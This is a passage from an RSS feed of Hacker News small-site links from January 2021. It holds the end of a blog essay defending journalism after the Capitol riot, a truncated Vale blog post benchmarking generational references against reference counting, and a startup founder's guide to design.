                    <p>Today is a difficult day in America, a difficult day to be an American.</p><p>Watching the videos of my fellow countrymen breaking windows to get into the U.S. Capitol, seeing the photos of our elected lawmakers huddling under chairs in the House chamber: these are images of our very democracy under attack -- all in an attempt to disrupt what is usually a ceremonial certification of an election.</p><p>As sad and disappointing as the situation is, what is worse is what got us here. &nbsp;Disinformation is real. The vilification of the news media is real. &nbsp;At some point in the last few years, we’ve bifurcated reality, politicizing verifiable facts and even the act of journalism itself.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">After I called them rioters just now on air, the crowd converged on the area press had gathered so we took off. This is a mob of violent rioters, no other way to put it.</p>— Alexander Marquardt (@MarquardtA) <a href="https://twitter.com/MarquardtA/status/1346940341409226754?ref_src=twsrc%5Etfw">January 6, 2021</a></blockquote>

</figure><p>America is a democracy -- a government by the people, for the people. &nbsp;And in order for the people to govern themselves, we need a well equipped press corps to keep us informed. &nbsp;There cannot be two sets of facts, two universes of truth. &nbsp;We need the reliable journalists to win, to keep us informed, so we can debate ideas, not facts.</p><p>Reporting is not a political act, but it’s also not simply stenography for the powerful. &nbsp;Digging, investigating, holding those in power accountable -- these are the ideals that journalism holds in the highest regard. </p><p>Most who work for reputable news organizations are obsessive in their caution to limit any appearance of impropriety. &nbsp;They adhere to strict editorial standards that the audience is largely unaware of. They are bound by policies and standards that guide how and what they report all designed to ensure credibility in the information they share.</p><p>And yet, disinformation runs wild. &nbsp;The downside of a platform where anyone can post anything, is that anyone can post anything. &nbsp;</p><p>I know many people do not like to pay for news. &nbsp;Frankly, it makes fiscal sense not to when you view it as a commodity and so much is available for free. &nbsp;But when news is commoditized, and taken from an aggregator or a social network, the provenance &nbsp;-- and credibility - can be a gamble.</p><p>It also means that there is ever less money funding the responsible reporting that we need so much. &nbsp;There are technical means to disable ads; there are methods to sneak around paywalls. &nbsp;But each of these actions means that journalism is ever so slightly less economically viable, with dire consequences.</p><p>Newspapers go bankrupt. &nbsp;</p><p>News websites turn to clickbait to attract the remaining ad-viewing traffic they so desperately need.</p><p>And others who abide by no ethics step up to fill the void, which can lead to plagiarizing total fabrication or conspiracy minded fantasists, breathlessly reporting the intricate details of insane theories about the dark side of our leaders. </p><p>All of this makes trust in all media decline (even those that are obsessively reliable), makes the profession less viable, and makes our democracy less informed.</p><p>All of this makes today’s scenes on Capitol Hill possible.</p><p>Journalism is not the enemy. &nbsp;It is the shield that protects us from those that wish to turn us against each other.</p>
                </div>
            </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://blog.nillium.com/defending-journalism-to-defend-the-republic/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25664719</guid>
            <pubDate>Thu, 07 Jan 2021 00:06:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Generational references: 2.3x faster than reference counting (unoptimized)]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25664708">thread link</a>) | @verdagon
<br/>
January 6, 2021 | https://vale.dev/blog/generational-memory | <a href="https://web.archive.org/web/*/https://vale.dev/blog/generational-memory">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div class="page">
    <div>
  

        <div>
          <div>
  

          <div>
            
    
<p>2.3x faster than reference counting, unoptimized!</p>

              <p><span>Jan 5 2021</span> </p>
      
</div>
<section>
<p>
<b>Generational references</b> are a new memory management technique that's easy, deterministic, and <i>very</i> fast.
</p>

</section>
<section>
<p>
This technique is the first ingredient in Vale's final <a href="https://vale.dev/blog/hybrid-generational-memory">hybrid-generational memory</a> design, which is even faster. Our eventual goal is to be as fast as Rust, and perhaps even as fast as C++, while being safer than both. <a href="#note0" data-noteid="0">0</a>
</p>
<p>
This article explains how generational references work, how they compare to reference counting, and what makes it all so fast. <a href="#note1" data-noteid="1">1</a>
</p>

</section>
<section>
<h2 id="built-on-single-ownership">
 Built on Single Ownership</h2>
<p>
Recall that in Vale, an object is freed when its <b>owning reference</b> goes out of scope. An object always has exactly one owning reference pointing to it.
</p>
<p>
We can have as many <b>non-owning</b> references as we want. <a href="#note2" data-noteid="2">2</a>
</p>
<p>
In other languages, when a programmer frees an object and then accidentally dereferences a non-owning reference to it, it can cause memory unsafety and vulnerabilities. <a href="#note3" data-noteid="3">3</a>
</p>
<p>
Our goal is to detect this situation and react to it safely. <a href="#note4" data-noteid="4">4</a>
</p>

</section>
<section>
<h2 id="generational-malloc-and-the-sacred-integer">
 Generational Malloc and the Sacred Integer</h2>
<p>
Generational references use <b>generational malloc</b>, which is like regular malloc, except at the top of every allocation is a <b>generation number</b>, which tracks how many objects have previously been at this memory location.
</p>
<p>
One could also think of it as describing "I am the <b>n</b>th inhabitant of this memory location".
</p>
<p>
Freeing an object will increment its generation number. Nobody else ever modifies it.
</p>

</section>
<section>
<p>
Later on, we use this number to see if a particular object is still alive, explained further below.
</p>

</section>
<section>
<p>
Generational malloc would normally be an adjustment to mimalloc or jemalloc, but we can simulate it with our own <span>genMalloc</span> and <span>genFree</span> functions:
</p>
<ul>
<li>
<span>genFree</span> increments the generation number, and instead of calling <span>free</span> <a href="#note5" data-noteid="5">5</a><a href="#note6" data-noteid="6">6</a>, remembers the allocation in a free-list. There's a free-list for every size class (16b, 24b, 32b, &lt;=48b, &lt;=64b, &lt;=128b, etc).
</li>
<li>
<span>genMalloc</span> pulls from a free-list if possible. If it's empty, it calls <span>malloc</span> and initializes the generation number to 1.
</li>
</ul>
<p>
You can find our experimental implementation in <a href="https://github.com/ValeLang/Vale/blob/master/Midas/src/builtins/genHeap.c">genHeap.c</a>.
</p>

</section>

      </div>
  
<div>

      <nav>
      <p>Generational References</p>
    


      </nav>
      
    

      <div>
        <div>
    
<div id="note0" data-noteid="0">
<p><span>0</span></p><section>
<p>
See <a href="https://vale.dev/blog/hybrid-generational-memory">HGM</a>'s afterword for a hypothetical comparison with Rust!
</p>

</section>
</div>
<div id="note1" data-noteid="1">
<p><span>1</span></p><section>
<p>
 Vale has three release modes:
</p>
<ul>
<li>
<b>Resilient:</b> Fast and 100% safe.
</li>
<li>
<b>Assist:</b> for development, detects logic problems.
</li>
<li>
<b>Unsafe:</b> turns off all safety.
</li>
</ul>
<p>
Resilient mode uses hybrid-generational memory.
</p>

</section>
</div>
<div id="note2" data-noteid="2">
<p><span>2</span></p><section>
<p>
This distinction is similar to C++'s <span>unique_ptr&lt;T&gt;</span> and <span>T*</span>.
</p>

</section>
</div>
<div id="note3" data-noteid="3">
<p><span>3</span></p><section>
<p>
Rust partially solves this, but forces complexity on the programmer and doesn't solve the <a href="https://en.wikipedia.org/wiki/ABA_problem">ABA problem</a>. We'd like a solution that's simpler, solves the whole problem, with as little <a href="https://vale.dev/blog/hybrid-generational-memory#afterword-how-might-it-compare-to-rust">run-time overhead as Rust</a>.
</p>

</section>
</div>
<div id="note4" data-noteid="4">
<p><span>4</span></p><section>
<p>
Such as by halting or stack unwinding.
</p>

</section>
</div>
<div id="note5" data-noteid="5">
<p><span>5</span></p><section>
<p>
 Our experimental implementation doesn't release memory back to the OS until exit, but when a page is empty, the final version will release the page back to the operating system and map its virtual memory to a read-only page containing all 0xFF.
</p>

</section>
</div>
<div id="note6" data-noteid="6">
<p><span>6</span></p><section>
<p>
 When an allocation's generation can't be incremented any more, it's not used again (at least until we can re-map the page).

</p>

</section>
</div>

        </div>
      </div>
    
</div>

    </div>
    <div>
      <div>
  
<section>
<h2 id="generational-reference-more-than-just-a-pointer">
 Generational Reference: More than just a pointer!</h2>

</section>
<section>
<p>
Vale's references are <b>generational references</b>. A generational reference has two things:
</p>
<ul>
<li>
A pointer to the object.
</li>
<li>
A "target generation" integer.
</li>
</ul>
<p>
To create a reference to an object, we get its allocation's generation number, and include it in the reference.
</p>

</section>

      </div>
  


    </div>
    <div>
      <div>
  
<section>
<h3 id="dereferencing">
 Dereferencing</h3>

</section>
<section>
<p>
To dereference a generational reference, we do a "liveness check" to see whether the allocation's generation number <b>still matches</b> our reference's target generation. <a href="#note7" data-noteid="7">7</a>
</p>
<p>
This prevents use-after-free problems, and makes Vale completely memory safe.
</p>

</section>
<section>
<p>
It's as if the reference is saying:
</p>
<p><b>"Hello! I'm looking for the 11th inhabitant of this house, are they still around?"</b>
</p>

</section>
<section>
<p>
and the person who opens the door says:
</p>
<p><b>"No, sorry, I'm the 12th inhabitant of this house, the 11th inhabitant is no more."</b> <a href="#note8" data-noteid="8">8</a>
</p>
<p>
or instead:
</p>
<p><b>"Yes! That is me. Which of my fields would you like to access?"</b>
</p>

</section>

      </div>
  
<div>

      <div>
        <div>
    
<div id="note7" data-noteid="7">
<p><span>7</span></p><section>
<p>
 This is similar to the "generational indices" technique from C++ and Rust, but applied to the entire world instead of just a specific vector.
</p>

</section>
</div>
<div id="note8" data-noteid="8">
<p><span>8</span></p><section>
<p>
 This will safely halt the program, unless the user is explicitly checking whether something is alive (such as for a weak reference).

</p>

</section>
</div>

        </div>
      </div>
    
</div>

    </div>
    <div>
      <div>
  
<section>
<h2 id="speed">
 Speed</h2>

</section>
<section>
<p>
Generational references are only the first steps towards hybrid-generational memory, but we decided to run some early experiments to see how it compares to existing memory models.
</p>
<p>
For this experiment, we benchmarked <a href="#note9" data-noteid="9">9</a> <a href="#note10" data-noteid="10">10</a> three flavors of Vale:
</p>
<ul>
<li>
<b>Unsafe</b>, with no memory safety, the equivalent of C++ (minus caveats, see below!)
</li>
<li>
<b>RC</b>, where we use naive reference counting for all our objects.
</li>
<li>
<b>GM</b>, which uses generational references.
</li>
</ul>

</section>
<section>
<div>
  <table>
    <thead>
      <tr>
        <th>Mode</th>
        <th>Speed&nbsp;(seconds)</th>
        <th>Overhead Compared to Unsafe (seconds)</th>
        <th>Overhead Compared to Unsafe (%)</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <th>Unsafe</th>
        <td>43.82&nbsp;seconds</td>
        <td>n/a</td>
        <td>n/a</td>
      </tr>
      <tr>
        <th>RC</th>
        <td>54.90&nbsp;seconds</td>
        <td>+11.08&nbsp;seconds</td>
        <td>+25.29%</td>
      </tr>
      <tr>
        <th>GM</th>
        <td>48.57&nbsp;seconds</td>
        <td>+4.75&nbsp;seconds</td>
        <td>+10.84%</td>
      </tr>
    </tbody>
  </table>
</div>


</section>

      </div>
  
<div>

      <div>
        <div>
    
<div id="note9" data-noteid="9">
<p><span>9</span></p><section>
<p>
 We used the <a href="https://github.com/ValeLang/Vale/tree/master/benchmarks/BenchmarkRL/vale">BenchmarkRL</a> terrain generator to gather these numbers, with different values for the <span>--region-override</span> flag: <span>unsafe-fast</span>, <span>naive-rc</span>, and <span>resilient-v3</span> respectively.
</p>

</section>
</div>
<div id="note10" data-noteid="10">
<p><span>10</span></p><section>
<p>
 Here, we benchmarked against other flavors of Vale, to isolate the differences between unsafe, reference-counting, and generational references.
</p>
<p>
Once we implement full hybrid-generational memory, we'll be benchmarking against C++ and Rust, stay tuned!

</p>

</section>
</div>

        </div>
      </div>
    
</div>

    </div>
    <div>
      <div>
  
<section>
<p>
Generational references have only 10.84% overhead, <b>less than half the cost of reference counting!</b> These are very promising results, and suggest that full hybrid-generational memory could be incredibly fast.
</p>

</section>
<section>
<p>
Try it out! In the Vale release, you can find a benchmark folder with scripts to run the benchmarks. You can find the source code for the various approaches <a href="https://github.com/ValeLang/Vale/tree/master/Midas/src/c-compiler/region">here</a> (feel free to swing by the <a href="https://discord.gg/SNB8yGH">discord server</a> and we can point you to the right files).
</p>

</section>

      </div>
  


    </div>
    <div>
      <div>
  
<section>
<p>
<b>Note these caveats!</b> To isolate the difference between generational references and the other approaches:
</p>
<ul>
<li>
In all flavors, we only allocate objects on the heap, except for primitives. Future versions will add stack allocations.
</li>
<li>
We used <a href="https://github.com/ValeLang/Vale/blob/master/Midas/src/builtins/genHeap.c">genHeap.c</a> for all versions, though only GM ever touches the generation number, the other versions ignore it. Future versions will integrate generational malloc into jemalloc or mimalloc directly.
</li>
</ul>
<p>
Once we address these limitations, we can get more precise benchmarks against the other approaches.
</p>

</section>

      </div>
  


    </div>
    <div>
      <div>
  
<section>
<h2 id="why-is-this-so-fast">
 Why is this so fast?</h2>

</section>
<section>
<p>
Generational references are much easier for the CPU to handle than reference-counted references, because:
</p>
<ul>
<li>
Generational references have no aliasing/dealiasing overhead, just on dereference.
</li>
<li>
Generational references cause less cache misses.
</li>
<li>
Liveness checks' branching is easier to predict than RC decrements' branching.
</li>
</ul>

</section>
<section>
<p>
We explain these two differences more below.
</p>

</section>

      </div>
  


    </div>
    <div>
      <div>
  
<section>
<h3 id="no-aliasing-costs">
 No Aliasing Costs</h3>

</section>
<section>
<p>
Reference counting is costly:
</p>
<ul>
<li>
Whenever we "alias" (make a new reference to an object), we have to dereference the object to increment its counter.
</li>
<li>
Whenever we "dealias" (throw away a reference), we have to:
</li>
<ul>
<li>
Dereference the object to decrement its counter,
</li>
<li>
If the counter is zero, deallocate it.
</li>
</ul>
</ul>
<p>
For example:
</p>

    <div>
      
      <p><span><span>fn <span>launchShip</span><span>(<span><span><span>ships</span></span> <span>&amp;<span><span>Map</span>&lt;<span>int</span>, <span>&amp;<span>Spaceship</span></span>&gt;</span></span></span>, <span><span><span>id</span></span> <span>int</span></span>, <span><span><span>armada</span></span> <span>&amp;<span><span>List</span>&lt;<span>&amp;<span>Spaceship</span></span>&gt;</span></span></span>)</span> <span>{<br>  <span><span><span><span>ship</span></span></span> = <span><span>ships</span><span>.</span><span>get</span>(<span>id</span>)</span></span>;<br>    <p>  <span><span>armada</span><span>.</span><span>add</span>(<span>ship</span>)</span>;</p><p>  <br>  <br>  <br>  <br>  <br>  <br>}</p></span></span></span></p>
    </div>
  
<p>
As you can see, reference counting incurs a cost whenever we alias or dealias. <b>Generational references don't have that cost.</b> The above snippet would have zero overhead if it used generational references.
</p>

</section>

      </div>
  


    </div>
    <div>
      <div>
  
<section>
<p>
Instead, generational references incur a cost whenever we dereference an object:
</p>

    <div>
      
      <p><span><span>fn <span>getShipName</span><span>(<span><span><span>ships</span></span> <span>&amp;<span><span>Map</span>&lt;<span>int</span>, <span>&amp;<span>Spaceship</span></span>&gt;</span></span></span>, <span><span><span>id</span></span> <span>int</span></span>)</span> <span><span>str</span> </span><span>{<br>  <span><span><span><span>ship</span></span></span> = <span><span>ships</span><span>.</span><span>get</span>(<span>id</span>)</span></span>;<p>  <br>  <br>  <span>ret <span><span>ship</span><span>.</span><span>name</span></span>;</span><br>}</p></span></span></span></p>
    </div>
  

</section>
<section>
<p>
This is cheaper because <b>programs dereference less than they alias and dealias:</b> our sample program had 4.7 million counter adjustments, but only 1.3 million liveness checks. <a href="#note11" data-noteid="11">11</a> <a href="#note12" data-noteid="12">12</a>
</p>

</section>
<section>
<h3 id="more-cache-friendly">
 More Cache Friendly</h3>
<p>
Reference counting is not very "cache friendly". Adding and subtracting integers is basically free on modern CPUs, but the real bottleneck in modern programs is how <i>far</i> those integers are: if it's been recently accessed, it's in the nearby cache, and only takes a few CPU cycles to fetch. Otherwise the CPU will "cache miss" and have to bring it in all the way from RAM, which could take <b>hundreds</b> of cycles. <a href="#note13" data-noteid="13">13</a>
</p>
<p>
In our reference-counted <span>launchShip</span> example, the <span>ship.__ref_count++</span> could take a few cycles if <span>ship</span> is already in the cache, or hundreds of cycles if it's not.
</p>

</section>
<section>
<p>
Generational references are more cache friendly:
</p>
<ul>
<li>
When a generational reference goes away, we don't need to reach into memory (unlike RC, where we have to decrement a counter).
</li>
<li>
We don't need to increment when aliasing (see previous section); we don't need to reach into memory to increment.
</li>
</ul>

</section>

      </div>
  
<div>

      <div>
        <div>
    
<div id="note11" data-noteid="11">
<p><span>11</span></p><section>
<p>
 Half of these are aliasings and half are dealiasings. Aliasing happens whenever we access a member (e.g. <span>person.name</span>) or make a new reference (e.g. <span>&amp;person</span>).
</p>

</section>
</div>
<div id="note12" data-noteid="12">
<p><span>12</span></p><section>
<p>
 Many languages are able to skip a lot of the adjustments, using static analysis. For example, Lobster can remove up to 95%. Our experiment doesn't have those optimizations; it compares naive RC to naive generational references.
</p>

</section>
</div>


        </div>
      </div>
    
</div>

    </div>
    <div>
      <div>
  
<section>
<h3 id="better-branch-prediction">
 Better Branch Prediction</h3>
<p>
For a given if-statement, CPUs will predict whether we'll go down the "then" branch or the "else" branch. This is called …</p></section></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://vale.dev/blog/generational-memory">https://vale.dev/blog/generational-memory</a></em></p>]]>
            </description>
            <link>https://vale.dev/blog/generational-memory</link>
            <guid isPermaLink="false">hacker-news-small-sites-25664708</guid>
            <pubDate>Thu, 07 Jan 2021 00:05:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A technical founder's guide to design]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25664671">thread link</a>) | @jmilinovich
<br/>
January 6, 2021 | https://blog.aesthetic.com/blog/founder-guide-design/ | <a href="https://web.archive.org/web/*/https://blog.aesthetic.com/blog/founder-guide-design/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="__next"><div><div><div><div><p>We’ve learned a lot at Aesthetic about how early stage companies can best leverage design to become more valuable. We’re excited to share our learnings from working with 100+ companies over the last 18 months. We hope this will be helpful to the entire startup community, especially founders that are just getting started on their journey and are new to design.</p><p>Design is a highly diverse discipline, with dozens of different fields and specialties. Similar to software product development, the scope and scale of design teams is highly variant and meant to reflect the needs of their organization. For early stage startups — those that are pre product-market fit, or have early market traction — the design needs tend to follow a similar pattern, and then tends to vary based on the specific business model of strong product market fit companies.</p><h2>The 3 most important types of design for early-stage companies</h2><p>At the highest level, founders of early stage companies should focus on:</p><ol><li>Product design</li><li>Web design</li><li>Brand design</li></ol><p>Here’s a breakdown of what each of these types of design means:</p><ul><li><strong>Product design is the user experience for your service or product.</strong> This doesn’t just include software that you build yourself, but also includes every other touchpoint you have with your customers or prospects. Product design isn’t just about creating user interfaces, but also developing wireframes, user research, and user experience testing.</li><li><strong>Web design is a company’s front door to the world.</strong> In 2020, your website is the most basic currency of reputation for every company, and needs to make it clear what you do and what people should care. For most companies, a website is step 0 for starting to get customers.</li><li><strong>Brand design is the why behind your company’s what.</strong> It’s how you explain who you are to people, by codifying the way you represent yourself across every surface. As <a href="https://en.wikipedia.org/wiki/Paul_Rand">Paul Rand</a> says, it’s “what people say about you when you’re not in the room.” This isn’t just your logo, fonts, colors, aesthetic and tone, but also the slide decks, emails, ads, and one pagers that you put out into the world.</li></ul><h2>What kind of design should my early-stage company focus on?</h2><p>How much effort should companies apply to each of these three types of design? It of course depends, but there are some easy rules-of-thumb you can follow:</p><ul><li><strong>Pre-product-market fit companies should focus almost entirely on product design</strong> — with less effort on web design and brand design. This means spending as much time as you possibly can working on your product, and then bookmarking a few hours each week to make copy edits to your website. Don’t focus too much on the visuals at this stage, but rather your messaging and information architecture.</li><li><strong>Early-market-traction companies should maintain focus on product design, but start to ramp up web and brand design.</strong> These companies should do spike projects to develop more website content and begin developing their first marketing channel(s) and content roadmap(s) to activate their audience.</li><li><strong>Strong-product-market-fit companies should focus across the board.</strong> Spend time clarifying your brand identity, and take the time to review your entire user experience. Then, up the ante on production across all channels by turning brand design into a service center that can be consumed by your cross-functional orgs (ie, marketing and sales).</li></ul><p>It depends on the current phase your company is in:</p><ul><li><strong>Pre-product-market fit companies should focus on talking to customers.</strong> You should be spending most of your time talking to users to understand their problems. All of the tools listed above are approachable, even if you’ve never “done design” before. You can read <a href="https://www.amazon.com/Dont-Make-Think-Revisited-Usability/dp/0321965515">Don’t Make Me Think</a>, <a href="https://www.amazon.com/Design-Everyday-Things-Revised-Expanded/dp/B07L5Y9HND/ref=sr_1_1?crid=260ZQHLO710HE&amp;keywords=design+of+everyday+things&amp;qid=1578340207&amp;s=books&amp;sprefix=design+of+%2Cstripbooks%2C270&amp;sr=1-1">Design of Everyday Things</a>, <a href="https://abookapart.com/products/just-enough-research">Just Enough Research</a> and watch <a href="https://www.youtube.com/watch?v=9urYWGx2uNk">Gary Tan’s YouTube lectures</a> as good primers on the subject if you’re interested.</li><li><strong>Early-market-traction companies should consider hiring contractors to help with web and brand design.</strong> At this stage, it’d be hard to justify staffing for product design unless the founding team still maintained all user research, and just needed support with UI/UX. It might also make sense to staff web design if you have proof it’s a really useful channel for you today.</li><li><strong>Strong-product-market-fit companies should start hiring staff designers.</strong> Think of the trade-offs for hiring full-time versus working with outside support. Think of how you’d invest into these three areas of design, and what the top goals would be from anyone you worked with to get help. Then, start staffing by hiring full-time design, freelancers, and/or working with an agency.</li></ul><p>If you’re new to design, here are a few concrete actions and tools we recommend:</p><ul><li><strong>User research:</strong> The Aesthetic team recommends scheduling 2–3 user research interviews each week, ideally at the end of the week so you can also do usability testing on new features from the week.</li><li><strong>Take notes and record sessions:</strong> Make sure the entire team’s in each interview and take notes, record the sessions and do an affinity mapping exercise to formalize your learnings. We recommend <a href="https://fullstory.com/">Fullstory</a> for recording app and website user sessions.</li><li><strong>Design your website:</strong> Aesthetic loves <a href="http://webflow.com/">Webflow</a> for this phase, not just because they’ve built an awesome product and great people, but also because they’re YC alum and former batchmates :)</li><li><strong>Iterate on your brand design:</strong> Aesthetic uses <a href="http://figma.com/">Figma</a> for all of our marketing template designs, and the Adobe suite for developing our (vector based) brand identities. Depending on the specific tech stack, there’s a wide variety of solutions for helping deploy design systems to enable reusability and consistency across your product teams. Figma’s collaboration and animation support is second to none.</li></ul></div></div></div></div></div></div>]]>
            </description>
            <link>https://blog.aesthetic.com/blog/founder-guide-design/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25664671</guid>
            <pubDate>Thu, 07 Jan 2021 00:03:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: I made a free iOS 14 home screen icon generator]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25664646">thread link</a>) | @millibar
<br/>
January 6, 2021 | https://myicon.io/ios-14-icon-editor | <a href="https://web.archive.org/web/*/https://myicon.io/ios-14-icon-editor">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://myicon.io/ios-14-icon-editor</link>
            <guid isPermaLink="false">hacker-news-small-sites-25664646</guid>
            <pubDate>Thu, 07 Jan 2021 00:01:12 GMT</pubDate>
        </item>
    </channel>
</rss>
